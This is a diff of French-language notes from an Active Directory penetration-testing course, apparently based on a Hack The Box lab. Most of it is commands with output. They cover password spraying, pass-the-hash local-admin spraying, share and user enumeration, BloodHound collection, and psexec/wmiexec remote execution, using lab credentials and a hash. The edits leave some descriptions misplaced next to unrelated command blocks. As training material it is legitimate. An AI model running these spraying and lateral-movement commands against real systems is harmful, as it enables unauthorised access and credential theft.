@@ -335,7 +335,8 @@ GPODisplayName : Default Domain Policy
 ```
 
 Utilise kerbrute pour énumérer les utilisateurs dans le domaine INLANEFREIGHT en utilisant le contrôleur de domaine INLANEFREIGHT.LOCAL et le fichier de noms d’utilisateur jsmith.txt.
-```
+
+```powershell
 kerbrute userenum -d INLANEFREIGHT --dc INLANEFREIGHT.LOCAL jsmith.txt                                                         
 
     __             __               __     
@@ -410,15 +411,112 @@ $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:232d64acb8a1f491a6fd11513d0881c3$1eadf
 2025/01/23 09:21:03 >  Done! Tested 48705 usernames (56 valid) in 11.225 seconds
 ```
 
+## Spray Responsibly
+
+### Internal Password Spraying from Linux
+
+Une fois que nous avons créé une liste de mots en utilisant l’une des méthodes présentées dans la section précédente, il est temps d’exécuter l’attaque. Rpcclient est une excellente option pour effectuer cette attaque depuis Linux. Une considération importante est qu’une connexion valide n’est pas immédiatement apparente avec rpcclient, la réponse “Authority Name” indiquant une connexion réussie. Nous pouvons filtrer les tentatives de connexion invalides en recherchant “Authority” dans la réponse. La commande Bash suivante (adaptée d’ici) peut être utilisée pour effectuer l’attaque.
+
+```bash
+keylian zergainoh@htb[/htb]$ for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
+
+Account Name: tjohnson, Authority Name: INLANEFREIGHT
+Account Name: sgage, Authority Name: INLANEFREIGHT
+```
+
+#### Using Kerbrute for the Attack
+
+```bash
+keylian zergainoh@htb[/htb]$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop
+
+2022/02/17 22:57:12 >  Using KDC(s):
+2022/02/17 22:57:12 >  	172.16.5.5:88
+
+2022/02/17 22:57:12 >  [+] VALID LOGIN:	 sgage@inlanefreight.local:Welcome1
+2022/02/17 22:57:12 >  Done! Tested 57 logins (1 successes) in 0.172 seconds
+```
+
+Il existe plusieurs autres méthodes pour effectuer une attaque de type “password spraying” à partir de Linux. Une autre excellente option est d’utiliser CrackMapExec. Cet outil polyvalent accepte un fichier texte de noms d’utilisateur à tester avec un seul mot de passe dans une attaque de type “spraying”. Ici, nous utilisons grep pour filtrer les échecs de connexion et nous concentrer uniquement sur les tentatives de connexion valides afin de ne rien manquer en faisant défiler de nombreuses lignes de sortie.
+
+```bash
+keylian zergainoh@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
+
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123 
+```
+
+#### Validating the Credentials with CrackMapExec
+
+```bash
+keylian zergainoh@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
+
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123
+```
+#### Local Admin Spraying with CrackMapExec
+
+```bash
+keylian zergainoh@htb[/htb]$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
+
+SMB         172.16.5.50     445    ACADEMY-EA-MX01  [+] ACADEMY-EA-MX01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
+SMB         172.16.5.25     445    ACADEMY-EA-MS01  [+] ACADEMY-EA-MS01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
+SMB         172.16.5.125    445    ACADEMY-EA-WEB0  [+] ACADEMY-EA-WEB0\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
+```
+
+### Internal Password Spraying - from Windows
+
+#### Using DomainPasswordSpray.ps1
+
+```powershell
+PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
+PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+
+[*] Current domain is compatible with Fine-Grained Password Policy.
+[*] Now creating a list of users to spray...
+[*] The smallest lockout threshold discovered in the domain is 5 login attempts.
+[*] Removing disabled users from list.
+[*] There are 2923 total users found.
+[*] Removing users within 1 attempt of locking out from list.
+[*] Created a userlist containing 2923 users gathered from the current user's domain
+[*] The domain password policy observation window is set to  minutes.
+[*] Setting a  minute wait in between sprays.
+
+Confirm Password Spray
+Are you sure you want to perform a password spray against 2923 accounts?
+[Y] Yes  [N] No  [?] Help (default is "Y"): Y
+
+[*] Password spraying has begun with  1  passwords
+[*] This might take a while depending on the total number of users
+[*] Now trying password Welcome1 against 2923 users. Current time is 2:57 PM
+[*] Writing successes to spray_success
+[*] SUCCESS! User:sgage Password:Welcome1
+[*] SUCCESS! User:tjohnson Password:Welcome1
+
+[*] Password spraying is complete
+[*] Any passwords that were successfully sprayed have been output to spray_success```
+
 
 Cette commande utilise un script PowerShell pour effectuer une attaque de pulvérisation de mots de passe sur un domaine Active Directory.
-```
+
+```powershell
 Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue
 ```
 
+## Deeper Down the Rabbit Hole
+
+
+### Enumerating Security Controls
 
 Cette commande PowerShell récupère l’état des différentes fonctionnalités de sécurité sur un ordinateur, en particulier celles liées à Windows Defender. Utile pour vérifier la configuration actuelle de Windows Defender, ce qui peut aider à comprendre quelles protections sont activées ou désactivées.
-```
+
+```powershell
 PS C:\htb> Get-MpComputerStatus
 
 AMEngineVersion                 : 1.1.17400.5
@@ -459,7 +557,8 @@ PSComputerName                  :
 
 Cette commande PowerShell récupère la politique AppLocker effective et affiche les collections de règles.
 Utile pour vérifier les règles AppLocker en vigueur sur un système, ce qui peut aider à comprendre quelles applications sont autorisées ou bloquées.
-```
+
+```powershell
 PS C:\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 
 PathConditions      : {%SYSTEM32%\WINDOWSPOWERSHELL\V1.0\POWERSHELL.EXE}
@@ -507,7 +606,8 @@ Action              : Allow
 
 Cette commande PowerShell affiche le mode de langage actuel de la session.
 Utile pour vérifier si la session PowerShell est en mode restreint ou complet, ce qui peut affecter l’exécution des scripts.
-```
+
+```powershell
 PS C:\htb> $ExecutionContext.SessionState.LanguageMode
 
 ConstrainedLanguage
@@ -515,7 +615,8 @@ ConstrainedLanguage
 
 
 Cette commande PowerShell recherche dans toutes les unités d’organisation (OU) pour identifier les groupes Active Directory (AD) qui ont des droits de lecture délégués sur l’attribut ms-Mcs-AdmPwd. Utile pour vérifier quelles entités ont accès aux mots de passe gérés par LAPS (Local Administrator Password Solution), ce qui peut aider à comprendre les permissions de sécurité en vigueur sur un système.
-```
+
+```powershell
 PS C:\htb> Find-LAPSDelegatedGroups
 
 OrgUnit                                             Delegated Groups
@@ -541,7 +642,8 @@ OU=Mail Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\LAPS Admins
 ```
 
 Cette commande PowerShell est utilisée pour rechercher les entités (principals) qui ont des droits étendus pour lire les attributs de mot de passe de la solution LAPS (Local Administrator Password Solution) dans Active Directory. Utile pour auditer les permissions et s’assurer que seuls les utilisateurs autorisés peuvent accéder aux mots de passe administratifs gérés par LAPS.
-```
+
+```powershell
 Find-AdmPwdExtendedRights
 
 ComputerName                Identity                    Reason
@@ -555,7 +657,8 @@ WS01.INLANEFREIGHT.LOCAL    INLANEFREIGHT\LAPS Admins   Delegated
 ```
 
 Cette commande PowerShell affiche tous les ordinateurs avec LAPS (Local Administrator Password Solution) activé, y compris les informations sur l’expiration des mots de passe et les mots de passe eux-mêmes si l’utilisateur a les droits d’accès nécessaires. Utile pour auditer les environnements Active Directory qui ont déployé LAPS, ce qui peut aider à comprendre quelles machines sont protégées et comment les mots de passe administratifs sont gérés.
-```
+
+```powershell
 PS C:\htb> Get-LAPSComputers
 
 ComputerName                Password       Expiration
@@ -566,6 +669,116 @@ SQL01.INLANEFREIGHT.LOCAL   9G#f;p41dcAe,s 09/26/2020 00:30:09
 WS01.INLANEFREIGHT.LOCAL    TCaG-F)3No;l8C 09/26/2020 00:46:04
 ```
 
+### Credentialed Enumeration from Linux
+
+
+```bash
+keylian zergainoh@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
+
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 0 baddpwdtime: 2022-03-29 12:29:14.476567
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\lab_adm                        badpwdcount: 0 baddpwdtime: 2022-04-09 23:04:58.611828
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\htb-student                    badpwdcount: 0 baddpwdtime: 2022-03-30 16:27:41.960920
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\avazquez                       badpwdcount: 3 baddpwdtime: 2022-02-24 18:10:01.903395
+
+<SNIP>
+```
+
+```bash
+keylian zergainoh@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain group(s)
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  Administrators                           membercount: 3
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  Users                                    membercount: 4
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  Guests                                   membercount: 2
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  Print Operators                          membercount: 0
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  Backup Operators                         membercount: 1
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  Replicator                               membercount: 0
+
+<SNIP>
+
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Admins                            membercount: 19
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Users                             membercount: 0
+
+<SNIP>
+
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  Contractors                              membercount: 138
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  Accounting                               membercount: 15
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  Engineering                              membercount: 19
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  Executives                               membercount: 10
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  Human Resources                          membercount: 36
+
+<SNIP>
+```
+
+```bash
+keylian zergainoh@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
+
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated shares
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  Share           Permissions     Remark
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  -----           -----------     ------
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  ADMIN$                          Remote Admin
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  C$                              Default share
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  Department Shares READ            
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  IPC$            READ            Remote IPC
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  NETLOGON        READ            Logon server share 
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  SYSVOL          READ            Logon server share 
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  User Shares     READ            
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  ZZZ_archive     READ 
+```
+
+Cette commande utilise CrackMapExec pour se connecter à un serveur SMB à l’adresse IP 172.16.5.5 avec les identifiants utilisateur forend et mot de passe Klmcargo2. Elle utilise le module spider_plus pour explorer le partage réseau spécifié (Department Shares). Utile pour découvrir et cartographier les partages réseau disponibles sur un système cible, en recherchant des fichiers et des informations sensibles.
+
+```bash
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
+
+```
+```bash
+keylian zergainoh@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
+
+[+] IP: 172.16.5.5:445	Name: inlanefreight.local                               
+        Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	C$                                                	NO ACCESS	Default share
+	Department Shares                                 	READ ONLY	
+	IPC$                                              	READ ONLY	Remote IPC
+	NETLOGON                                          	READ ONLY	Logon server share 
+	SYSVOL                                            	READ ONLY	Logon server share 
+	User Shares                                       	READ ONLY	
+	ZZZ_archive                                       	READ ONLY
+```
+```bash
+keylian zergainoh@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
+
+[+] IP: 172.16.5.5:445	Name: inlanefreight.local                               
+        Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	Department Shares                                 	READ ONLY	
+	.\Department Shares\*
+	dr--r--r--                0 Thu Mar 31 15:34:29 2022	.
+	dr--r--r--                0 Thu Mar 31 15:34:29 2022	..
+	dr--r--r--                0 Thu Mar 31 15:14:48 2022	Accounting
+	dr--r--r--                0 Thu Mar 31 15:14:39 2022	Executives
+	dr--r--r--                0 Thu Mar 31 15:14:57 2022	Finance
+	dr--r--r--                0 Thu Mar 31 15:15:04 2022	HR
+	dr--r--r--                0 Thu Mar 31 15:15:21 2022	IT
+	dr--r--r--                0 Thu Mar 31 15:15:29 2022	Legal
+	dr--r--r--                0 Thu Mar 31 15:15:37 2022	Marketing
+	dr--r--r--                0 Thu Mar 31 15:15:47 2022	Operations
+	dr--r--r--                0 Thu Mar 31 15:15:58 2022	R&D
+	dr--r--r--                0 Thu Mar 31 15:16:10 2022	Temp
+	dr--r--r--                0 Thu Mar 31 15:16:18 2022	Warehouse
+
+    <SNIP>
+```
 
 Cette série de commandes rpcclient permet d’effectuer plusieurs actions pour auditer un environnement Active Directory. Voici ce que chaque partie de la commande fait :
 
@@ -576,6 +789,7 @@ queryuser 0x492 : Récupère les informations détaillées sur un utilisateur sp
 enumdomgroups : Énumère tous les groupes du domaine. Cela te donne une liste complète des groupes présents dans le domaine.
 
 querygroup 0xff0 : Récupère les informations détaillées sur un groupe spécifique en utilisant son RID. Cela te permet d’obtenir des détails précis sur ce groupe particulier.
+
 ```
 rpcclient $> enumdomusers
 queryuser 0x492
@@ -583,22 +797,79 @@ enumdomgroups
 querygroup 0xff0
 ```
 
-Cette commande utilise CrackMapExec pour se connecter à un serveur SMB à l’adresse IP 172.16.5.5 avec les identifiants utilisateur forend et mot de passe Klmcargo2. Elle utilise le module spider_plus pour explorer le partage réseau spécifié (Department Shares). Utile pour découvrir et cartographier les partages réseau disponibles sur un système cible, en recherchant des fichiers et des informations sensibles.
-```
-sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
-
-```
-
 Cette commande utilise l’outil psexec.py d’Impacket pour se connecter à un hôte Windows à l’adresse IP 172.16.5.125 via le partage administratif ADMIN$ en utilisant les identifiants utilisateur wley et mot de passe transporter@4 dans le domaine inlanefreight.local. Utile pour obtenir un accès à distance avec des privilèges administratifs sur la machine cible.
+
+```bash
+eylian zergainoh@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
+
+[+] Using Domain Controller at: 172.16.5.5
+[+] Getting defaultNamingContext from Root DSE
+[+]     Found: DC=INLANEFREIGHT,DC=LOCAL
+[+] Attempting bind
+[+]     ...success! Binded as:
+[+]      u:INLANEFREIGHT\forend
+[+] Attempting to enumerate all AD privileged users
+[+] Using DN: CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+[+]     Found 28 nested users for group Domain Admins:
+
+cn: Administrator
+userPrincipalName: administrator@inlanefreight.local
+
+cn: lab_adm
+
+cn: Angela Dunn
+userPrincipalName: adunn@inlanefreight.local
+
+cn: Matthew Morgan
+userPrincipalName: mmorgan@inlanefreight.local
+
+cn: Dorothy Click
+userPrincipalName: dclick@inlanefreight.local
+
+<SNIP>
+
+[+] Using DN: CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+[+]     Found 3 nested users for group Enterprise Admins:
+
+cn: Administrator
+userPrincipalName: administrator@inlanefreight.local
+
+cn: lab_adm
+
+cn: Sharepoint Admin
+userPrincipalName: sp-admin@INLANEFREIGHT.LOCAL
+
+<SNIP>
 ```
+
+```bash
+keylian zergainoh@htb[/htb]$ sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 
+
+INFO: Found AD domain: inlanefreight.local
+INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+INFO: Found 1 domains
+INFO: Found 2 domains in the forest
+INFO: Found 564 computers
+INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+INFO: Found 2951 users
+INFO: Connecting to GC LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+INFO: Found 183 groups
+INFO: Found 2 trusts
+INFO: Starting computer enumeration with 10 workers
+
+<SNIP>
+```
+```bash
 psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
 ```
 
 Cette commande utilise l’outil wmiexec.py d’Impacket pour se connecter à un hôte Windows à l’adresse IP 172.16.5.5 via WMI (Windows Management Instrumentation) en utilisant les identifiants utilisateur wley et mot de passe transporter@4 dans le domaine inlanefreight.local. Utile pour exécuter des commandes à distance sur la machine cible avec des privilèges administratifs.
-```
+
+```bash
 wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
 ```
-```
+
+```powershell
 
 Get-Module
 ModuleType Version    Name                                ExportedCommands
@@ -657,7 +928,8 @@ UsersContainer                     : CN=Users,DC=INLANEFREIGHT,DC=LOCAL
 
 
 Cette commande PowerShell récupère tous les comptes d’utilisateurs dans Active Directory qui ont un attribut ServicePrincipalName non nul. Utile pour identifier les comptes de service, car ces comptes sont souvent utilisés par des applications et des services pour s’authentifier auprès d’autres services.
-```
+
+```powershell
  Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
 
 DistinguishedName    : CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
@@ -689,7 +961,8 @@ UserPrincipalName    :
 
 
 Cette commande PowerShell récupère toutes les relations de confiance (trusts) dans Active Directory. Utile pour obtenir une vue d’ensemble des relations de confiance établies entre différents domaines ou forêts, ce qui peut aider à comprendre les connexions et les permissions entre eux.
-```
+
+```powershell
  Get-ADTrust -Filter *
 
 Direction               : BiDirectional
@@ -743,7 +1016,8 @@ UsesRC4Encryption       : False
 
 
 Cette commande PowerShell récupère tous les groupes dans Active Directory et sélectionne uniquement leurs noms. Utile pour obtenir une liste complète des noms de groupes présents dans un environnement Active Directory, ce qui peut aider à organiser et à gérer les permissions et les accès.
-```
+
+```powershell
  Get-ADGroup -Filter * | select name
 
 name
@@ -782,7 +1056,8 @@ Domain Admins
 
 
 Cette commande PowerShell récupère les informations sur le groupe “Backup Operators” dans Active Directory. Utile pour obtenir des détails spécifiques sur ce groupe, comme ses membres, ses attributs et ses permissions, ce qui peut aider à gérer les accès et les rôles de sauvegarde dans un environnement Active Directory.
-```
+
+```powershell
 Get-ADGroup -Identity "Backup Operators"
 
 DistinguishedName : CN=Backup Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL
@@ -866,7 +1141,8 @@ Examinons certaines des capacités de PowerView et voyons quelles données il re
 
 
 Cette commande PowerShell récupère les informations détaillées sur un utilisateur spécifique dans Active Directory (AD) en utilisant son identité (ici, mmorgan) et le domaine spécifié (inlanefreight.local). Elle sélectionne ensuite des propriétés spécifiques de l’utilisateur pour les afficher. Utile pour obtenir des détails précis sur un utilisateur particulier, ce qui peut aider à gérer les comptes et les permissions dans un environnement AD.
-```
+
+```powershell
 Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
 
 name                 : Matthew Morgan
@@ -888,7 +1164,8 @@ useraccountcontrol   : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
 ```
 
 Cette commande PowerShell utilise PowerView pour récupérer tous les membres du groupe “Domain Admins” dans Active Directory, y compris les membres des groupes imbriqués. Utile pour obtenir une vue complète des utilisateurs et groupes ayant des privilèges administratifs dans le domaine, ce qui peut aider à auditer les permissions et à identifier les risques de sécurité potentiels.
-```
+
+```powershell
 Get-DomainGroupMember -Identity "Domain Admins" -Recurse
 
 GroupDomain             : INLANEFREIGHT.LOCAL
